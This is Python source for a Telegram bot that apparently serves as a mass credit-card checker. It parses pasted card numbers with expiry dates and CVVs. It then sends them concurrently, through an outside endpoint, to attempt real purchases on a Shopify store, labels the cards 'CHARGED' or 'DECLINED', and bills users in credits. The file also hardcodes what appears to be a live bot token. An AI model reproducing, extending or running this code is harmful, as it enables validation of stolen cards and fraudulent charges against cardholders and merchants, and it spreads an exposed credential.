import asyncio
import aiohttp
import json
import re
import logging
import time
import html
import random
import os
import uuid
from datetime import datetime, timedelta
from typing import List, Dict
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
from telegram.error import BadRequest, TelegramError
from user_agent import generate_user_agent

# Initialize logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = "8415055284:AAGrhcc5-ZK3H92h6ehEDDJ7xU2hOY424A0"  # ⚠️ Replace with your bot token
ADMIN_ID = 5218397363  # Your Telegram ID
PHOTO_URL = "https://i.ibb.co/FqVrcwC4/1000087100.jpg"
DEVELOPER_NAME = "ᴍʀ❦ᴘᴇʀꜰᴇᴄᴛ"

# SHOPIFY CONFIGURATION
SHOPIFY_SITES = [
    "https://hundredhearts.myshopify.com",
    # Add more Shopify sites as needed
]

# CREDIT CONFIGURATION
CREDITS_PER_CARD = 2  # Credits deducted for successful orders
MAX_THREADS = 25  # Maximum concurrent threads (20-25 as requested)
MAX_CARDS_PER_REQUEST = 50  # Maximum cards per mass check

# JSON file storage
USERS_FILE = 'users.json'

# Data storage functions
def load_json(filepath):
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            return json.load(f)
    return {}

def save_json(filepath, data):
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=2)

# User management
def get_user_data(user_id):
    users = load_json(USERS_FILE)
    user_str = str(user_id)
    
    if user_str not in users:
        users[user_str] = {
            'credits': 100,  # Default 100 credits for all users
            'total_checks': 0,
            'successful_charges': 0,
            'last_check': None,
            'joined_at': datetime.now().isoformat()
        }
        save_json(USERS_FILE, users)
    
    return users[user_str]

def update_user_data(user_id, data):
    users = load_json(USERS_FILE)
    user_str = str(user_id)
    if user_str in users:
        users[user_str].update(data)
    else:
        users[user_str] = data
    save_json(USERS_FILE, users)

def can_use_credits(user_id, cards_count):
    user_data = get_user_data(user_id)
    credits_needed = cards_count * CREDITS_PER_CARD
    return user_data['credits'] >= credits_needed

def use_credits(user_id, cards_count, is_successful=True):
    """Deduct credits only for successful charges"""
    if not is_successful:
        return False  # No credits deducted for declined cards
    
    user_data = get_user_data(user_id)
    credits_needed = cards_count * CREDITS_PER_CARD
    
    if user_data['credits'] >= credits_needed:
        user_data['credits'] -= credits_needed
        user_data['total_checks'] += cards_count
        user_data['successful_charges'] += cards_count if is_successful else 0
        user_data['last_check'] = datetime.now().isoformat()
        update_user_data(user_id, user_data)
        return True
    
    return False

def add_user_credits(user_id, amount):
    user_data = get_user_data(user_id)
    user_data['credits'] = user_data.get('credits', 0) + amount
    update_user_data(user_id, user_data)
    return user_data['credits']

# BIN Lookup
async def get_bin_info(bin_number):
    """Get BIN information from binlist.net"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://lookup.binlist.net/{bin_number}", timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return {
                        "brand": (data.get("scheme", "N/A") or "N/A").upper(),
                        "bank": (data.get("bank", {}).get("name", "N/A") or "N/A").upper(),
                        "country": f"{(data.get('country', {}).get('name', 'N/A') or 'N/A').upper()} {data.get('country', {}).get('emoji', '')}",
                        "type": (data.get("type", "N/A") or "N/A").upper()
                    }
    except Exception as e:
        logger.error(f"BIN lookup failed: {e}")
    return {"brand": "N/A", "bank": "N/A", "country": "N/A", "type": "N/A"}

# Card extraction
def extract_card_details(text):
    """Extract CC details from text"""
    match = re.search(r'(\d{15,16})[|/\s]+(\d{1,2})[|/\s]+(\d{2,4})[|/\s]+(\d{3,4})', text)
    if match:
        ccn, mm, yy, cvv = match.groups()
        mm = mm.zfill(2)
        if len(yy) == 2:
            yy = "20" + yy
        return {
            "full": f"{ccn}|{mm}|{yy}|{cvv}",
            "number": ccn,
            "month": mm,
            "year": yy,
            "cvv": cvv,
            "bin": ccn[:6]
        }
    return None

# Shopify Payments API
async def check_shopify_payment(card_details: Dict, site_url: str, proxy: str = "") -> Dict:
    """
    Check Shopify payment using the provided endpoint
    """
    start_time = time.time()
    
    try:
        # Build API URL [citation:1]
        api_url = f"https://shopi-production-7ef9.up.railway.app/?cc={card_details['full']}&url={site_url}&proxy={proxy}"
        
        headers = {
            'User-Agent': generate_user_agent()
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, headers=headers, timeout=30) as resp:
                response_text = await resp.text()
                try:
                    data = json.loads(response_text)
                except json.JSONDecodeError:
                    data = {"Response": response_text[:100]}
                
                elapsed = round(time.time() - start_time, 2)
                
                return {
                    "success": "Order completed 💎" in data.get("Response", ""),
                    "response": data.get("Response", "Unknown"),
                    "price": data.get("Price", "1.59"),
                    "gate": data.get("Gate", "Shopify Payments"),
                    "site": data.get("Site", site_url),
                    "elapsed": elapsed,
                    "raw_data": data
                }
                
    except asyncio.TimeoutError:
        return {
            "success": False,
            "response": "Request timeout",
            "price": "1.59",
            "gate": "Shopify Payments",
            "site": site_url,
            "elapsed": round(time.time() - start_time, 2),
            "raw_data": {}
        }
    except Exception as e:
        return {
            "success": False,
            "response": f"Error: {str(e)}",
            "price": "1.59",
            "gate": "Shopify Payments",
            "site": site_url,
            "elapsed": round(time.time() - start_time, 2),
            "raw_data": {}
        }

# Mass processing with semaphore for concurrency control
async def process_cards_concurrently(cards: List[Dict], site_url: str, max_workers: int = MAX_THREADS):
    """
    Process cards concurrently with thread control
    """
    semaphore = asyncio.Semaphore(max_workers)
    
    async def process_with_semaphore(card):
        async with semaphore:
            return await check_shopify_payment(card, site_url)
    
    tasks = [process_with_semaphore(card) for card in cards]
    return await asyncio.gather(*tasks, return_exceptions=True)

# Format results
def format_result_message(card_details: Dict, result: Dict, user_name: str) -> str:
    """Format individual card result message"""
    # Determine status based on response
    if "Order completed 💎" in result.get("response", ""):
        status = "CHARGED ❤️‍🔥"
    else:
        status = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"
    
    # Get BIN info (we'll get this separately)
    bin_info = {"bank": "N/A", "country": "N/A", "brand": "N/A"}
    
    return (
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"• 𝘾𝙖𝙧𝙙: <code>{html.escape(card_details['full'])}</code>\n"
        f"• 𝙎𝙩𝙖𝙩𝙪𝙨: <b>{status}</b>\n"
        f"• 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: <code>{html.escape(str(result.get('response', 'No response'))[:100])}</code>\n"
        f"• 𝙋𝙧𝙞𝙘𝙚: ${result.get('price', '1.59')}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"» 𝘽𝙞𝙣: <code>{card_details.get('bin', 'N/A')}</code>\n"
        f"» 𝘽𝙖𝙣𝙠: <code>{html.escape(bin_info['bank'])}</code>\n"
        f"» 𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{html.escape(bin_info['country'])}</code>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"» 𝙋𝙧𝙤𝙭𝙮: N/A • LIVE\n"
        f"» 𝙏𝙞𝙢𝙚: {result.get('elapsed', 0)}s\n"
        f"» 𝘽𝙮: {DEVELOPER_NAME}\n"
    )

def format_summary_message(user_id: int, cards_count: int, successful_count: int, failed_count: int, credits_used: int) -> str:
    """Format summary message"""
    user_data = get_user_data(user_id)
    
    return (
        f"📊 𝙎𝙪𝙢𝙢𝙖𝙧𝙮 𝙍𝙚𝙥𝙤𝙧𝙩\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"• 𝙏𝙤𝙩𝙖𝙡 𝘾𝙖𝙧𝙙𝙨: {cards_count}\n"
        f"• 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 ❤️‍🔥: {successful_count}\n"
        f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌: {failed_count}\n"
        f"• 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 𝘿𝙚𝙙𝙪𝙘𝙩𝙚𝙙: {credits_used}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"» 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝘾𝙧𝙚𝙙𝙞𝙩𝙨: {user_data['credits']}\n"
        f"» 𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙨: {user_data['total_checks']}\n"
        f"» 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙍𝙖𝙩𝙚: {round((successful_count/cards_count)*100 if cards_count > 0 else 0, 2)}%\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"𝘽𝙤𝙩 𝘽𝙮: {DEVELOPER_NAME}"
    )

# Main MSP command handler
async def msp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /msp command - Mass Shopify Payments"""
    user = update.effective_user
    start_time = time.time()
    
    # Check if user is admin
    if user.id != ADMIN_ID:
        await update.message.reply_text("❌ This bot is for admin use only.")
        return
    
    # Get cards from message
    cards = []
    if update.message.reply_to_message:
        text = update.message.reply_to_message.text or ""
        lines = text.split('\n')
        for line in lines:
            card_details = extract_card_details(line)
            if card_details:
                cards.append(card_details)
    elif context.args:
        # Try to parse cards from command arguments
        text = " ".join(context.args)
        lines = text.split('\n')
        for line in lines:
            card_details = extract_card_details(line)
            if card_details:
                cards.append(card_details)
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found.\n\nSend cards in format:\n1234567890123456|12|2025|123\nor reply to a message with cards.")
        return
    
    # Limit cards per request
    if len(cards) > MAX_CARDS_PER_REQUEST:
        await update.message.reply_text(f"❌ Maximum {MAX_CARDS_PER_REQUEST} cards per request.")
        return
    
    # Check credits
    if not can_use_credits(user.id, len(cards)):
        user_data = get_user_data(user.id)
        await update.message.reply_text(
            f"❌ Insufficient credits!\n"
            f"You need {len(cards) * CREDITS_PER_CARD} credits\n"
            f"Current credits: {user_data['credits']}\n"
            f"Cards: {len(cards)} × {CREDITS_PER_CARD} credits each"
        )
        return
    
    # Send processing message
    processing_msg = await update.message.reply_text(
        f"🔍 Processing {len(cards)} cards with Shopify Payments...\n"
        f"Using {MAX_THREADS} concurrent threads\n"
        f"Please wait..."
    )
    
    # Get BIN info for all cards concurrently
    bin_tasks = [get_bin_info(card['bin']) for card in cards]
    bin_results = await asyncio.gather(*bin_tasks, return_exceptions=True)
    
    # Process cards with Shopify Payments
    site_url = SHOPIFY_SITES[0]  # Use first site
    results = await process_cards_concurrently(cards, site_url, MAX_THREADS)
    
    # Process results
    successful_cards = []
    failed_cards = []
    
    for i, (card, result, bin_info) in enumerate(zip(cards, results, bin_results)):
        if isinstance(result, Exception):
            # Handle exceptions
            result_data = {
                "success": False,
                "response": f"Error: {str(result)}",
                "price": "1.59",
                "elapsed": 0,
                "raw_data": {}
            }
        else:
            result_data = result
        
        # Store bin info
        if isinstance(bin_info, dict):
            card['bin_info'] = bin_info
        else:
            card['bin_info'] = {"bank": "N/A", "country": "N/A", "brand": "N/A"}
        
        if result_data.get("success"):
            successful_cards.append((card, result_data))
        else:
            failed_cards.append((card, result_data))
    
    # Calculate credits to deduct (only for successful charges)
    successful_count = len(successful_cards)
    credits_to_deduct = successful_count * CREDITS_PER_CARD
    
    # Update user credits (only for successful charges)
    if successful_count > 0:
        use_credits(user.id, successful_count, is_successful=True)
    
    # Send individual results
    total_elapsed = round(time.time() - start_time, 2)
    
    # Send successful results first
    if successful_cards:
        await update.message.reply_text(f"✅ 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 𝘾𝘼𝙍𝘿𝙎 ({len(successful_cards)})")
        
        for card, result in successful_cards:
            message = format_result_message(card, result, user.first_name)
            try:
                await update.message.reply_text(message, parse_mode=ParseMode.HTML)
                await asyncio.sleep(0.5)  # Small delay to avoid rate limiting
            except Exception as e:
                logger.error(f"Failed to send message: {e}")
    
    # Send failed results
    if failed_cards:
        await update.message.reply_text(f"❌ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 𝘾𝘼𝙍𝘿𝙎 ({len(failed_cards)})")
        
        for card, result in failed_cards:
            message = format_result_message(card, result, user.first_name)
            try:
                await update.message.reply_text(message, parse_mode=ParseMode.HTML)
                await asyncio.sleep(0.5)
            except Exception as e:
                logger.error(f"Failed to send message: {e}")
    
    # Send summary
    summary = format_summary_message(
        user.id,
        len(cards),
        len(successful_cards),
        len(failed_cards),
        credits_to_deduct
    )
    
    await update.message.reply_text(summary, parse_mode=ParseMode.HTML)
    
    # Delete processing message
    try:
        await processing_msg.delete()
    except:
        pass

# Credits command
async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user credits"""
    user = update.effective_user
    user_data = get_user_data(user.id)
    
    message = (
        f"💰 𝘾𝙧𝙚𝙙𝙞𝙩 𝘽𝙖𝙡𝙖𝙣𝙘𝙚\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"• 𝙐𝙨𝙚𝙧: {user.first_name}\n"
        f"• 𝘾𝙧𝙚𝙙𝙞𝙩𝙨: {user_data['credits']}\n"
        f"• 𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙨: {user_data['total_checks']}\n"
        f"• 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡 𝘾𝙝𝙖𝙧𝙜𝙚𝙨: {user_data['successful_charges']}\n"
        f"• 𝙇𝙖𝙨𝙩 𝘾𝙝𝙚𝙘𝙠: {user_data['last_check'] or 'Never'}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"» 𝘾𝙤𝙨𝙩 𝙥𝙚𝙧 𝙘𝙖𝙧𝙙: {CREDITS_PER_CARD} credits\n"
        f"» 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 𝙤𝙣𝙡𝙮 𝙙𝙚𝙙𝙪𝙘𝙩𝙚𝙙 𝙛𝙤𝙧 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 charges\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"𝘽𝙤𝙩 𝘽𝙮: {DEVELOPER_NAME}"
    )
    
    await update.message.reply_text(message)

# Start command
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    
    welcome_text = (
        f"✨ 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙋𝙖𝙮𝙢𝙚𝙣𝙩𝙨 𝘽𝙤𝙩 ✨\n\n"
        f"👤 𝙐𝙨𝙚𝙧: {user.first_name}\n"
        f"🆔 𝙄𝘿: `{user.id}`\n\n"
        f"📋 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨:\n"
        f"• /msp - Mass Shopify Payments check\n"
        f"• /credits - Check your credit balance\n"
        f"• /addcredits <amount> - Add credits (admin only)\n\n"
        f"⚙️ 𝘾𝙤𝙣𝙛𝙞𝙜𝙪𝙧𝙖𝙩𝙞𝙤𝙣:\n"
        f"• Max threads: {MAX_THREADS}\n"
        f"• Max cards/request: {MAX_CARDS_PER_REQUEST}\n"
        f"• Credits/card: {CREDITS_PER_CARD} (charged only)\n\n"
        f"👨‍💻 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧: {DEVELOPER_NAME}"
    )
    
    keyboard = [
        [InlineKeyboardButton("𝙍𝙐𝙉 𝙈𝘼𝙎𝙎 𝘾𝙃𝙀𝘾𝙆", callback_data='run_mass')],
        [InlineKeyboardButton("𝘾𝙍𝙀𝘿𝙄𝙏𝙎", callback_data='show_credits')],
        [InlineKeyboardButton("𝙃𝙀𝙇𝙋", callback_data='show_help')]
    ]
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

# Add credits command (admin only)
async def addcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add credits to user (admin only)"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    try:
        amount = int(context.args[0])
        if amount <= 0:
            await update.message.reply_text("❌ Amount must be positive.")
            return
        
        # If user ID is provided, add to that user, otherwise to the sender
        if len(context.args) > 1:
            target_user_id = int(context.args[1])
        else:
            target_user_id = update.effective_user.id
        
        new_balance = add_user_credits(target_user_id, amount)
        
        await update.message.reply_text(
            f"✅ Credits added!\n"
            f"Amount: {amount}\n"
            f"User ID: {target_user_id}\n"
            f"New balance: {new_balance}"
        )
        
    except (IndexError, ValueError):
        await update.message.reply_text("⚠️ Usage: /addcredits <amount> [user_id]")

# Stats command
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot statistics"""
    users = load_json(USERS_FILE)
    
    total_users = len(users)
    total_credits = sum(user.get('credits', 0) for user in users.values())
    total_checks = sum(user.get('total_checks', 0) for user in users.values())
    total_charges = sum(user.get('successful_charges', 0) for user in users.values())
    
    message = (
        f"📊 𝘽𝙤𝙩 𝙎𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙘𝙨\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"• 𝙏𝙤𝙩𝙖𝙡 𝙐𝙨𝙚𝙧𝙨: {total_users}\n"
        f"• 𝙏𝙤𝙩𝙖𝙡 𝘾𝙧𝙚𝙙𝙞𝙩𝙨: {total_credits}\n"
        f"• 𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙨: {total_checks}\n"
        f"• 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡 𝘾𝙝𝙖𝙧𝙜𝙚𝙨: {total_charges}\n"
        f"• 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙍𝙖𝙩𝙚: {round((total_charges/total_checks)*100 if total_checks > 0 else 0, 2)}%\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"• 𝙈𝙖𝙭 𝙏𝙝𝙧𝙚𝙖𝙙𝙨: {MAX_THREADS}\n"
        f"• 𝙈𝙖𝙭 𝘾𝙖𝙧𝙙𝙨/𝙍𝙚𝙦: {MAX_CARDS_PER_REQUEST}\n"
        f"• 𝘾𝙧𝙚𝙙𝙞𝙩𝙨/𝘾𝙖𝙧𝙙: {CREDITS_PER_CARD}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"𝘽𝙤𝙩 𝘽𝙮: {DEVELOPER_NAME}"
    )
    
    await update.message.reply_text(message)

# Callback query handler
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'run_mass':
        await query.edit_message_text(
            "📋 𝙎𝙚𝙣𝙙 𝙘𝙖𝙧𝙙𝙨 𝙞𝙣 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩:\n\n"
            "1234567890123456|12|2025|123\n"
            "1234567890123457|01|2026|456\n"
            "1234567890123458|06|2024|789\n\n"
            "𝙊𝙍 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙖𝙧𝙙𝙨 𝙬𝙞𝙩𝙝 /𝙢𝙨𝙥"
        )
    elif query.data == 'show_credits':
        user = query.from_user
        user_data = get_user_data(user.id)
        await query.edit_message_text(
            f"💰 𝙔𝙤𝙪𝙧 𝘾𝙧𝙚𝙙𝙞𝙩𝙨:\n"
            f"• 𝘽𝙖𝙡𝙖𝙣𝙘𝙚: {user_data['credits']}\n"
            f"• 𝘾𝙝𝙚𝙘𝙠𝙨: {user_data['total_checks']}\n"
            f"• 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙚𝙨: {user_data['successful_charges']}\n\n"
            f"𝙐𝙨𝙚 /𝙘𝙧𝙚𝙙𝙞𝙩𝙨 𝙛𝙤𝙧 𝙙𝙚𝙩𝙖𝙞𝙡𝙨"
        )
    elif query.data == 'show_help':
        await query.edit_message_text(
            f"🆘 𝙃𝙚𝙡𝙥\n\n"
            f"📌 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨:\n"
            f"• /start - Show welcome message\n"
            f"• /msp - Mass check cards\n"
            f"• /credits - Check credit balance\n"
            f"• /stats - Bot statistics\n\n"
            f"📌 𝙁𝙤𝙧𝙢𝙖𝙩:\n"
            f"• Card: 1234567890123456|12|2025|123\n"
            f"• Year can be 2 or 4 digits\n"
            f"• One card per line\n\n"
            f"📌 𝘾𝙧𝙚𝙙𝙞𝙩𝙨:\n"
            f"• {CREDITS_PER_CARD} credits per SUCCESSFUL charge\n"
            f"• NO credits deducted for declined cards\n"
            f"• Contact admin to add credits\n\n"
            f"👨‍💻 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧: {DEVELOPER_NAME}"
        )

# Setup handlers
def setup_handlers(application):
    # Basic commands
    application.add_handler(CommandHandler('start', start_command))
    application.add_handler(CommandHandler('msp', msp_command))
    application.add_handler(CommandHandler('credits', credits_command))
    application.add_handler(CommandHandler('addcredits', addcredits_command))
    application.add_handler(CommandHandler('stats', stats_command))
    
    # Callback handlers
    application.add_handler(CallbackQueryHandler(button_handler))

# Main function
def main():
    print("="*60)
    print("SHOPIFY PAYMENTS MASS CHECK BOT")
    print("="*60)
    print(f"Max Threads: {MAX_THREADS}")
    print(f"Max Cards/Request: {MAX_CARDS_PER_REQUEST}")
    print(f"Credits per Card: {CREDITS_PER_CARD} (charged only)")
    print(f"Default Credits: 100")
    print(f"Admin ID: {ADMIN_ID}")
    print("="*60)
    
    # Check for bot token
    if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        print("❌ ERROR: Please set your BOT_TOKEN in the configuration!")
        print("Get token from @BotFather on Telegram")
        return
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Setup handlers
    setup_handlers(application)
    
    print("✅ Bot is ready!")
    print("📱 Commands available:")
    print("  /start - Welcome message")
    print("  /msp - Mass Shopify Payments check")
    print("  /credits - Check credit balance")
    print("  /addcredits - Add credits (admin)")
    print("  /stats - Bot statistics")
    print("="*60)
    print("Polling for updates...")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
